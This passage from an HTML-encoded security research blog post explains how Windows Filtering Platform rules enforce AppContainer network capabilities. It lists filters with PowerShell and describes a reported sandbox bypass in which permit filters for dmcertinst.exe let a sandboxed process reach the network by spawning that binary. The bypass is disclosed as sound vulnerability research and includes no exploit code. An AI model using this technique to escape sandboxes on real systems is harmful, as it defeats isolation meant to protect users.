class="c0"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID Equal &amp;nbsp; &amp;nbsp; Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;O:LSD:(A;;CC;;;S-1-15-3-1)(A;;CC;;;WD)(A;;CC;;;AN)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;In this example we create a new token using the same package SID but with &lt;/span&gt;&lt;span class="c7"&gt;internetClient &lt;/span&gt;&lt;span&gt;capability. When we connect the socket we now no longer get an error and the connection is permitted. Checking for the &lt;/span&gt;&lt;span class="c7"&gt;ClassifyAllow &lt;/span&gt;&lt;span class="c2"&gt;event we find the &amp;ldquo;InternetClient Default Rule&amp;rdquo; filter matched the connection.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Looking at the conditions we can see that it will only match if the socket creator is in an AppContainer based on the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_PACKAGE_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;condition. The &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;also ensures that it will only match if the creator has the &lt;/span&gt;&lt;span class="c7"&gt;internetCapability &lt;/span&gt;&lt;span&gt;capability &lt;/span&gt;&lt;span class="c2"&gt;which is S-1-15-3-1 in the SDDL format. This filter is what&amp;#39;s granting access to the network.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;One odd thing is in the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS&lt;/span&gt;&lt;span&gt;&amp;nbsp;condition. It seems to match on all possible IPv4 addresses. Shouldn&amp;#39;t this exclude network addresses on our local &amp;ldquo;private&amp;rdquo; network? At the very least you&amp;#39;d assume this would block the reserved IP address ranges from &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://datatracker.ietf.org/doc/html/rfc1918"&gt;RFC1918&lt;/a&gt;&lt;/span&gt;&lt;span&gt;? The key to understanding this is the profile ID conditions, which are both set to &lt;/span&gt;&lt;span class="c7"&gt;Public&lt;/span&gt;&lt;span class="c2"&gt;. The computer I&amp;#39;m running these commands on has a single network interface configured to the public profile as shown:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c7"&gt;&lt;a href="https://1.bp.blogspot.com/-NFdSUcpgaOo/YRw9mSPQJ2I/AAAAAAAAbhk/Lt3luF1tl7YIvKtmZ-8ivm26rRY_uH0NgCNcBGAsYHQ/s724/profile.PNG" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-NFdSUcpgaOo/YRw9mSPQJ2I/AAAAAAAAbhk/Lt3luF1tl7YIvKtmZ-8ivm26rRY_uH0NgCNcBGAsYHQ/s600/profile.PNG" border="0" alt="Image showing the option of either Public or Private network profiles." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Therefore the firewall is configured to treat all network addresses in the same context, granting the &lt;/span&gt;&lt;span class="c7"&gt;internetClient &lt;/span&gt;&lt;span&gt;capability access to any address including your local &amp;ldquo;private&amp;rdquo; network. This might be unexpected. In fact if you enumerate all the filters on the machine you won&amp;#39;t find any filter to match the &lt;/span&gt;&lt;span class="c7"&gt;privateNetworkClientServer &lt;/span&gt;&lt;span&gt;capability and using the capability will not grant access to any network resource.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;If you switch the network profile to &lt;/span&gt;&lt;span class="c7"&gt;Private&lt;/span&gt;&lt;span class="c2"&gt;, you&amp;#39;ll find there&amp;#39;s now three &amp;ldquo;InternetClient Default Rule&amp;rdquo; filters (note on Windows 11 there will only be one as it uses the OR&amp;#39;ing feature of conditions as mentioned above to merge the three rules together).&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e09797f750872be5db7da696cd4a2a5f50a66242"&gt;&lt;/a&gt;&lt;a id="t.16"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 0.0.0.0 High: 10.0.0.0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID Equal &amp;nbsp; &amp;nbsp; Private&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; Private&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 239.255.255.255 High: 255.255.255.255&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 10.255.255.255 High: 224.0.0.0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;As you can see in the first filter, it covers addresses 0.0.0.0 to 10.0.0.0. The machine&amp;#39;s private network is 10.0.0.0/8. The profile IDs are also now set to &lt;/span&gt;&lt;span class="c7"&gt;Private&lt;/span&gt;&lt;span class="c2"&gt;. The other two exclude the entire 10.0.0.0/8 network as well as the multicast group addresses from 224.0.0.0 to 240.0.0.0. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The profile ID conditions are important here if you have more than one network interface. For example if you have two, one &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span&gt;and one &lt;/span&gt;&lt;span class="c7"&gt;Private,&lt;/span&gt;&lt;span&gt;&amp;nbsp;you would get a filter for the &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span&gt;network covering the entire IP address range and the three &lt;/span&gt;&lt;span class="c7"&gt;Private &lt;/span&gt;&lt;span&gt;ones excluding the private network addresses. The &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span&gt;filter won&amp;#39;t match if the network traffic is being sent from the &lt;/span&gt;&lt;span class="c7"&gt;Private &lt;/span&gt;&lt;span class="c2"&gt;network interface preventing the application without the right capability from accessing the private network.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Speaking of which, we can also now identify the filter which will match the private network capability. There&amp;#39;s two, to cover the private network range and the multicast range. We&amp;#39;ll just show one of them.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a018aad6f03aa23b66eb2eed774b31b3af479be6"&gt;&lt;/a&gt;&lt;a id="t.17"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : PrivateNetwork Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: e0194c63-c9e4-42a5-bbd4-06d90532d5e6&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 71640&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: PrivateNetwork Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 36029209335832512&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 10.0.0.0 High: 10.255.255.255&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID Equal &amp;nbsp; &amp;nbsp; Private&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; Private&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;O:LSD:(A;;CC;;;S-1-15-3-3)(A;;CC;;;WD)(A;;CC;;;AN)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;We can see in the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;condition that the connection would be permitted if the creator has the &lt;/span&gt;&lt;span class="c7"&gt;privateNetworkClientServer &lt;/span&gt;&lt;span class="c2"&gt;capability, which is S-1-15-3-3 in SDDL. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;It is slightly ironic that the &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span&gt;network profile is probably recommended even if you&amp;#39;re on your own private network (Windows 11 even makes the recommendation explicit as shown below) in that it should reduce the exposed attack surface of the device from others on the network. However if an AppContainer application with the &lt;/span&gt;&lt;span class="c7"&gt;internetClient &lt;/span&gt;&lt;span&gt;capability could be compromised it opens up your private network to access where the &lt;/span&gt;&lt;span class="c7"&gt;Private &lt;/span&gt;&lt;span class="c2"&gt;profile wouldn&amp;#39;t. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c7"&gt;&lt;a href="https://1.bp.blogspot.com/-W7haB-YeYqQ/YRw9mm66sRI/AAAAAAAAbho/SAWak_bgpX8TYGyOYl6YFuKeub9O96w7ACNcBGAsYHQ/s782/public_network.PNG" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-W7haB-YeYqQ/YRw9mm66sRI/AAAAAAAAbho/SAWak_bgpX8TYGyOYl6YFuKeub9O96w7ACNcBGAsYHQ/s600/public_network.PNG" border="0" alt="Image showing the option of either Public or Private network profiles. This is from Windows 11 where Public is marked as recommended." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c7"&gt;Aside: one thing you might wonder, if your network interface is marked as Private and the AppContainer application only has the internetClient capability, what happens if your DNS server is your local router at 10.0.0.1? Wouldn&amp;#39;t the application be blocked from making DNS requests? Windows has a DNS client service which typically is always running. This service is what usually makes DNS requests on behalf of applications as it allows the results to be cached. The RPC server which the service exposes allows callers which have any of the three network capabilities to connect to it and make DNS requests, avoiding the problem. Of course if the service is disabled in-process DNS lookups will start to be used, which could result in weird name resolving issues depending on your network configuration.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;We can now understand how &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2207"&gt;issue 2207&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;I reported to Microsoft bypasses the capability requirements. If in the &lt;/span&gt;&lt;span class="c7"&gt;MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;span&gt;&amp;nbsp;sublayer for an outbound connection there are &lt;/span&gt;&lt;span class="c7"&gt;Permit&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;filters which are evaluated before the &amp;ldquo;Block Outbound Default Rule&amp;rdquo; filter then it might be possible to avoid needing capabilities. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.950a47990d20f68e9c5415069eb009e1cf2ed411"&gt;&lt;/a&gt;&lt;a id="t.18"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -AleLayer ConnectV4 -Sorted | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Where-Object SubLayerKeyName -eq MICROSOFT_DEFENDER_SUBLAYER_WSH |&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Select-Object ActionType, Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c35"&gt;Permit &amp;nbsp; &amp;nbsp; Allow outbound TCP traffic from dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Permit &amp;nbsp; &amp;nbsp; Allow outbound TCP traffic from omadmclient.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Permit &amp;nbsp; &amp;nbsp; Allow outbound TCP traffic from deviceenroller.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Permit &amp;nbsp; &amp;nbsp; InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Permit &amp;nbsp; &amp;nbsp; InternetClientServer Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;Block all outbound traffic from SearchFilterHost&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;Block outbound traffic from dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;Block outbound traffic from omadmclient.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;Block outbound traffic from deviceenroller.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c31"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;Block Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Block &amp;nbsp; &amp;nbsp; &amp;nbsp;WSH Default Outbound Block&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 72753 | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : Allow outbound TCP traffic from dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 5237f74f-6346-4038-a48d-4b779f862e65&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 72753&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: Indexed&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 422487342972928&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_APP_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;\device\harddiskvolume3\windows\system32\dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_PROTOCOL Equal &amp;nbsp; &amp;nbsp; Tcp&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;As we can see in the output there are quite a few &lt;/span&gt;&lt;span class="c7"&gt;Permit &lt;/span&gt;&lt;span&gt;filters before the &amp;ldquo;Block Outbound Default Rule&amp;rdquo; filter, and of course I&amp;#39;ve also cropped the list to make it smaller. If we inspect the &amp;ldquo;Allow outbound TCP traffic from dmcertinst.exe&amp;rdquo; filter we find that it only matches on the App ID and the IP protocol. As it doesn&amp;#39;t have an AppContainer specific checks, then any sockets created in the context of a &lt;/span&gt;&lt;span class="c7"&gt;dmcertinst&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;process would be permitted to make TCP connections. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Once the &amp;ldquo;Allow outbound TCP traffic from dmcertinst.exe&amp;rdquo; filter matches the sublayer evaluation is terminated and it never reaches the &amp;ldquo;Block Outbound Default Rule&amp;rdquo; filter. This is fairly trivial to exploit, as long as the AppContainer process is allowed to spawn new processes, which is allowed by default.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c33" id="h.mkob28po89sq"&gt;&lt;span class="c16"&gt;Server Capabilities&lt;/span&gt;&lt;/h3&gt; &lt;p class="c4"&gt;&lt;span&gt;What about the &lt;/span&gt;&lt;span class="c7"&gt;internetClientServer&lt;/span&gt;&lt;span&gt;&amp;nbsp;capability, how does that function? First, there&amp;#39;s a second set of outbound filters to cover the capability with the same network addresses as the base &lt;/span&gt;&lt;span class="c7"&gt;internetClient &lt;/span&gt;&lt;span&gt;capability. The only difference is the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_USER_ID&lt;/span&gt;&lt;span&gt;&amp;nbsp;condition checks for the &lt;/span&gt;&lt;span class="c7"&gt;internetClientServer (S-1-15-3-2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;capability instead. For inbound connections the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;layer contains the filter.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5c5fd583c9a660791b58c690297988f818b902ce"&gt;&lt;/a&gt;&lt;a id="t.19"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -AleLayer RecvAcceptV4 -Sorted | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Where-Object Name -Match InternetClientServer | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span 